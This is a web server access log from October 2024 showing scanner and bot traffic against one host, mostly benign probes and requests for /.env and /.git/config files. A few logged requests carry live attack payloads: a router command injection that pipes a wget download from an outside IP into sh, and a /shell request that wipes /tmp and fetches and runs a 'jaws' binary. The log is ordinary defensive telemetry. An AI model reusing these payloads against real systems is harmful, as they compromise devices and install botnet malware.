217.148.140.139 - - [20/Oct/2024:00:03:08 +0000] "GET /58uz HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux; rv:74.0) Gecko/20100101 Firefox/74.0"
193.177.162.138 - - [21/Oct/2024:14:36:41 +0000] "GET / HTTP/1.1" 200 1401 "http://54.224.97.58/phpinfo.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
93.123.85.155 - - [21/Oct/2024:14:52:34 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
93.123.85.155 - - [21/Oct/2024:14:52:35 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
93.174.93.12 - - [21/Oct/2024:15:26:10 +0000] "GET / HTTP/1.0" 200 1401 "-" "Mozilla/5.0 (Linux; Android 9; Moto Z3 Play) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
202.112.238.240 - - [21/Oct/2024:15:28:17 +0000] "GET /T2fp HTTP/1.1" 302 - "-" "Go-http-client/1.1"
202.112.238.240 - - [21/Oct/2024:15:28:18 +0000] "GET / HTTP/1.1" 200 1401 "http://54.224.97.58:80/T2fp" "Go-http-client/1.1"
202.112.238.240 - - [21/Oct/2024:15:28:18 +0000] "\x16\x03\x01" 400 226 "-" "-"
202.112.238.240 - - [21/Oct/2024:15:28:19 +0000] "GET /jquery-3.3.1.min.js HTTP/1.1" 302 - "-" "Go-http-client/1.1"
202.112.238.240 - - [21/Oct/2024:15:28:19 +0000] "GET / HTTP/1.1" 200 1401 "http://54.224.97.58:80/jquery-3.3.1.min.js" "Go-http-client/1.1"
202.112.238.240 - - [21/Oct/2024:15:28:19 +0000] "\x16\x03\x01" 400 226 "-" "-"
43.157.22.57 - - [21/Oct/2024:16:04:12 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
93.123.85.155 - - [21/Oct/2024:16:04:55 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
93.123.85.155 - - [21/Oct/2024:16:04:55 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
42.60.108.30 - - [21/Oct/2024:16:30:13 +0000] "GET / HTTP/1.0" 200 1401 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
1.34.100.72 - - [21/Oct/2024:16:30:28 +0000] "GET / HTTP/1.0" 200 1401 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
211.20.122.203 - - [21/Oct/2024:16:47:52 +0000] "GET / HTTP/1.0" 200 1401 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
185.224.128.67 - - [21/Oct/2024:17:11:04 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.17.31%2Ft%7Csh%3B%60) HTTP/1.1" 404 196 "-" "Go-http-client/1.1"
185.224.128.67 - - [21/Oct/2024:17:11:27 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.17.31%2Ft%7Csh%3B%60) HTTP/1.1" 404 196 "-" "Go-http-client/1.1"
91.90.42.154 - - [21/Oct/2024:17:14:33 +0000] "\x16\x03" 400 226 "-" "-"
91.90.42.154 - - [21/Oct/2024:17:14:33 +0000] "GET /2nrJ HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Win64; x64; Trident/6.0; Avant Browser)"
91.90.42.154 - - [21/Oct/2024:17:14:33 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Win64; x64; Trident/6.0; Avant Browser)"
91.90.42.154 - - [21/Oct/2024:17:14:33 +0000] "GET /bVcB HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Win64; x64; Trident/6.0; Avant Browser)"
91.90.42.154 - - [21/Oct/2024:17:24:35 +0000] "\x16\x03" 400 226 "-" "-"
91.90.42.154 - - [21/Oct/2024:17:24:35 +0000] "GET /lPMS HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;ENUSMSCOM)"
91.90.42.154 - - [21/Oct/2024:17:24:35 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;ENUSMSCOM)"
91.90.42.154 - - [21/Oct/2024:17:24:35 +0000] "GET /tGq1 HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;ENUSMSCOM)"
220.134.244.39 - - [21/Oct/2024:17:27:41 +0000] "GET / HTTP/1.0" 200 1401 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
51.161.83.117 - - [21/Oct/2024:17:38:30 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.161.83.117 - - [21/Oct/2024:17:38:30 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
80.82.77.202 - - [21/Oct/2024:17:50:06 +0000] "GET / HTTP/1.0" 200 1401 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.88 Safari/537.36 Vivaldi/2.4.1488.36"
198.235.24.145 - - [21/Oct/2024:18:28:29 +0000] "GET / HTTP/1.0" 200 1401 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
129.232.209.234 - - [21/Oct/2024:18:31:13 +0000] "GET /hUSL HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
217.212.244.67 - - [21/Oct/2024:18:31:24 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
51.161.83.117 - - [21/Oct/2024:18:36:59 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.161.83.117 - - [21/Oct/2024:18:37:00 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
122.117.239.206 - - [21/Oct/2024:18:37:58 +0000] "GET / HTTP/1.0" 200 1401 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
114.35.11.75 - - [21/Oct/2024:18:58:14 +0000] "GET / HTTP/1.0" 200 1401 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
59.126.70.226 - - [21/Oct/2024:19:15:39 +0000] "GET / HTTP/1.0" 200 1401 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
36.138.205.33 - - [21/Oct/2024:19:18:19 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
36.138.205.33 - - [21/Oct/2024:19:18:20 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.224.128.47 - - [21/Oct/2024:19:33:12 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
114.33.111.135 - - [21/Oct/2024:19:34:20 +0000] "GET / HTTP/1.0" 200 1401 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
51.161.83.117 - - [21/Oct/2024:20:06:36 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.161.83.117 - - [21/Oct/2024:20:06:36 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.243.212.81 - - [21/Oct/2024:20:36:53 +0000] "GET /.git/config HTTP/1.1" 302 - "-" "python-requests/2.25.1"
114.35.68.51 - - [21/Oct/2024:20:58:05 +0000] "GET / HTTP/1.0" 200 1401 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
172.168.40.176 - - [21/Oct/2024:21:39:22 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 zgrab/0.x"
179.43.191.98 - - [21/Oct/2024:21:48:19 +0000] "GET / HTTP/1.1" 200 1401 "-" "-"
51.161.83.117 - - [21/Oct/2024:22:04:29 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.161.83.117 - - [21/Oct/2024:22:04:29 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.161.83.117 - - [21/Oct/2024:22:46:27 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.161.83.117 - - [21/Oct/2024:22:46:27 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
41.234.149.42 - - [21/Oct/2024:22:48:54 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 129.159.107.197/jaws;sh+/tmp/jaws" 400 226 "-" "-"
122.118.228.139 - - [21/Oct/2024:22:50:17 +0000] "GET / HTTP/1.0" 200 1401 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
121.254.64.10 - - [21/Oct/2024:22:58:44 +0000] "GET / HTTP/1.0" 200 1401 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
206.168.34.57 - - [21/Oct/2024:23:03:57 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.57 - - [21/Oct/2024:23:04:00 +0000] "GET /favicon.ico HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.57 - - [21/Oct/2024:23:04:01 +0000] "GET / HTTP/1.1" 200 1401 "http://54.224.97.58/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.57 - - [21/Oct/2024:23:04:02 +0000] "PRI * HTTP/2.0" 400 226 "-" "-"
